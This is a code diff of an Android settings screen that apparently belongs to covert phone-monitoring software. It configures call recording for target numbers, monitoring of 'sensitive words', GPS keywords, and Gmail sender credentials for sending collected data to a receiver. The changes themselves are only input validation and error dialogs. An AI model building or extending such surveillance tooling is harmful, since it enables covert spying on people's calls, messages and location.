@@ -26,6 +26,8 @@ import android.preference.PreferenceScreen;
 import android.util.Log;
 
 import system.service.R;
+
+import com.particle.inspector.common.util.RegExpUtil;
 import com.particle.inspector.common.util.SysUtils;
 import com.particle.inspector.common.util.StrUtils;
 import com.particle.inspector.common.util.license.LicenseCtrl;
@@ -62,7 +64,6 @@ public class GlobalPrefActivity extends PreferenceActivity
 		setSpecialSummary();
 		
 		// Set state of recording target number
-		//SharedPreferences sp = getPreferenceScreen().getSharedPreferences();
 		SharedPreferences sp = PreferenceManager.getDefaultSharedPreferences(this);
 		setRecordTargetNumState(sp, this);
 		
@@ -81,16 +82,19 @@ public class GlobalPrefActivity extends PreferenceActivity
 				else if (key.equals("pref_sender_mail")) {
 					String oriSenderMail = sharedPreferences.getString("pref_sender_mail", "");
 					String senderMail = oriSenderMail.trim();
-					if(!StrUtils.validateMailAddress(senderMail)) {
-						String msg = String.format(getResources().getString(R.string.pref_invalid_mail_format), senderMail);
-						SysUtils.messageBox(context, msg);
+					if(!StrUtils.validateMailAddress(senderMail) || !senderMail.toLowerCase().endsWith("gmail.com")) {
+						String title = getResources().getString(R.string.error);
+						String msg = String.format(getResources().getString(R.string.pref_invalid_sender_mail), senderMail);
+						SysUtils.errorDlg(context, title, msg);
 					}
 				}
 				else if (key.equals("pref_sender_pwd")) {
 					String oriSenderPwd = sharedPreferences.getString("pref_sender_pwd", "");
 					String senderPwd = oriSenderPwd.trim();
 					if (senderPwd.length() <= 0) {
-						SysUtils.messageBox(context, getResources().getString(R.string.pref_pls_input_pwd));
+						String title = getResources().getString(R.string.error);
+						String msg   = getResources().getString(R.string.pref_pls_input_pwd);
+						SysUtils.errorDlg(context, title, msg);
 					}
 				}
 				else if (key.equals("pref_recv_mail")) {
@@ -100,30 +104,42 @@ public class GlobalPrefActivity extends PreferenceActivity
 				else if (key.equals("pref_recv_phonenum")) {
 					String oriPhoneNum = sharedPreferences.getString("pref_recv_phonenum", "");
 					String phoneNum = oriPhoneNum.trim();
-					if (phoneNum.length() == 0) {
-						SysUtils.messageBox(context, getResources().getString(R.string.pref_pls_input_phonenum));
+					Pattern p = Pattern.compile(RegExpUtil.VALID_PHONE_NUM);
+					Matcher matcher = p.matcher(phoneNum);
+					if (!matcher.matches()) {
+						String title = getResources().getString(R.string.error);
+						String msg   = getResources().getString(R.string.pref_pls_input_valid_recv_phonenum);
+						SysUtils.errorDlg(context, title, msg);
 					}
+					else enableReceiverInfoChgFlag();
 					//if (!phoneNum.equals(oriPhoneNum)) setRedirectPhoneNum(getApplicationContext(), phoneNum);
-					if (phoneNum.length() > 0) enableReceiverInfoChgFlag();
-				}
-				else if (key.equals("pref_info_interval")) {
-					String intervalStr = sharedPreferences.getString("pref_info_interval", "1"); //day
-					int interval = Integer.parseInt(intervalStr);
 				}
 				else if (key.equals("pref_record_all")) {
 					setRecordTargetNumState(sharedPreferences, GlobalPrefActivity.this);
 				}
 				else if (key.equals("pref_record_target_number")) {
-					String oriNumbers = sharedPreferences.getString("pref_record_target_number", "");
-					String numbers = oriNumbers.trim();
-					if (numbers.length() == 0 && !getRecordAll(context)) {
+					String oriNumbersStr = sharedPreferences.getString("pref_record_target_number", "");
+					String numbersStr = oriNumbersStr.trim();
+					if (numbersStr.length() == 0 && !getRecordAll(context)) {
 						SysUtils.messageBox(context, getResources().getString(R.string.pref_pls_input_target_number));
 					} else {
-						numbers = numbers.replaceAll(" {2,}", TARGET_NUMBER_BREAKER); // Remove duplicated blank spaces
-						if (numbers.split(TARGET_NUMBER_BREAKER).length > MAX_TARGET_NUM_COUNT) {
-							String msg = String.format(getResources().getString(R.string.pref_sensitive_words_count_reach_max), MAX_SENSITIVE_WORD_COUNT);
-							String title = context.getResources().getString(R.string.warning);
-							SysUtils.warningDlg(context, title, msg);
+						String[] numbers = numbersStr.replaceAll(RegExpUtil.MULTIPLE_BLANKSPACES, TARGET_NUMBER_BREAKER)
+													 .split(TARGET_NUMBER_BREAKER);
+						if (numbers.length > MAX_TARGET_NUM_COUNT) {
+							String title = getResources().getString(R.string.error);
+							String msg = String.format(getResources().getString(R.string.pref_target_num_count_reach_max), MAX_TARGET_NUM_COUNT);
+							SysUtils.errorDlg(context, title, msg);
+						} else {
+							Pattern p = Pattern.compile(RegExpUtil.RECORD_TARGET_NUM);
+							for (int i=0; i < numbers.length; i++) {
+						    	Matcher matcher = p.matcher(numbers[i]);
+						    	if (!matcher.matches()) {
+						    		String title = getResources().getString(R.string.error);
+						    		String msg = String.format(getResources().getString(R.string.pref_target_num_format_error));
+									SysUtils.errorDlg(context, title, msg);
+						    		break;
+						    	}
+							}
 						}
 					}
 				}
@@ -133,11 +149,11 @@ public class GlobalPrefActivity extends PreferenceActivity
 					if (words.length() == 0) {
 						SysUtils.messageBox(context, getResources().getString(R.string.pref_pls_input_sensitive_words));
 					} else {
-						words = words.replaceAll(" {2,}", SENSITIVE_WORD_BREAKER); // Remove duplicated blank spaces
+						words = words.replaceAll(RegExpUtil.MULTIPLE_BLANKSPACES, SENSITIVE_WORD_BREAKER); // Remove duplicated blank spaces
 						if (words.split(SENSITIVE_WORD_BREAKER).length > MAX_SENSITIVE_WORD_COUNT) {
+							String title = getResources().getString(R.string.error);
 							String msg = String.format(getResources().getString(R.string.pref_sensitive_words_count_reach_max), MAX_SENSITIVE_WORD_COUNT);
-							String title = context.getResources().getString(R.string.warning);
-							SysUtils.warningDlg(context, title, msg);
+							SysUtils.errorDlg(context, title, msg);
 						}
 					}
 					//if (!words.equals(oriWords)) setSensitiveWords(getApplicationContext(), words);
@@ -200,14 +216,15 @@ public class GlobalPrefActivity extends PreferenceActivity
 		String mail = oriMail.trim();
 		//if (!mail.equals(oriMail)) setMail(context, mail);
 		String[] mails = mail.split(",");
-	    Pattern p = Pattern.compile(StrUtils.REGEXP_MAIL);
+	    Pattern p = Pattern.compile(RegExpUtil.VALID_MAIL_ADDR);
 	    
 	    for (String eachMail : mails) {
 	    	if (eachMail.trim().length() > 0) {
 	    		Matcher matcher = p.matcher(eachMail.trim());
    	 			if (!matcher.matches()) {
+   	 				String title = getResources().getString(R.string.error);
    	 				String msg = String.format(context.getResources().getString(R.string.pref_invalid_mail_format), eachMail.trim());
-   	 				SysUtils.messageBox(context, msg);
+   	 				SysUtils.errorDlg(context, title, msg);
    	 				valid = false;
    	 				break;
    	 			}
@@ -227,9 +244,9 @@ public class GlobalPrefActivity extends PreferenceActivity
 			
 			// If not use self sender, cannot record all phone calls
 			if (getRecordAll(context)) {
-				String title = context.getResources().getString(R.string.warning);
+				String title = getResources().getString(R.string.error);
 				String msg   = context.getResources().getString(R.string.pref_must_use_self_sender);
-				SysUtils.warningDlg(context, title, msg);
+				SysUtils.errorDlg(context, title, msg);
 				CheckBoxPreference mCheckBoxPreference = (CheckBoxPreference)getPreferenceScreen().findPreference("pref_use_self_sender");
 				if (mCheckBoxPreference != null) {
 					mCheckBoxPreference.setChecked(true);
@@ -246,9 +263,9 @@ public class GlobalPrefActivity extends PreferenceActivity
 				getSenderMail(context).length()     <= 0 ||
 				getSenderPassword(context).length() <= 0) 
 			{	
-				String title = context.getResources().getString(R.string.warning);
+				String title = getResources().getString(R.string.error);
 				String msg   = context.getResources().getString(R.string.pref_must_use_self_sender);
-				SysUtils.warningDlg(context, title, msg);
+				SysUtils.errorDlg(context, title, msg);
 				CheckBoxPreference mCheckBoxPreference = (CheckBoxPreference)getPreferenceScreen().findPreference("pref_record_all");
 				if (mCheckBoxPreference != null) {
 					mCheckBoxPreference.setChecked(false);
@@ -354,7 +371,7 @@ public class GlobalPrefActivity extends PreferenceActivity
 	}
 	
 	public static void setSensitiveWords(Context context, String value) {
-		PreferenceManager.getDefaultSharedPreferences(context).edit().putString("pref_sensitive_words", value).commit();
+		PreferenceManager.getDefaultSharedPreferences(context).edit().putString("pref_sensitive_words", value.trim()).commit();
 	}
 	
 	public static String getGpsWord(Context context) {
@@ -362,15 +379,7 @@ public class GlobalPrefActivity extends PreferenceActivity
 	}
 	
 	public static void setGpsWord(Context context, String value) {
-		PreferenceManager.getDefaultSharedPreferences(context).edit().putString("pref_gps_word", value).commit();
-	}
-	
-	public static boolean getDisplayGpsSMS(Context context) {
-		return PreferenceManager.getDefaultSharedPreferences(context).getBoolean("pref_gps_show_sms", false);
-	}
-	
-	public static void setDisplayGpsSMS(Context context, boolean value) {
-		PreferenceManager.getDefaultSharedPreferences(context).edit().putBoolean("pref_gps_show_sms", value).commit();
+		PreferenceManager.getDefaultSharedPreferences(context).edit().putString("pref_gps_word", value.trim()).commit();
 	}
 	
 }
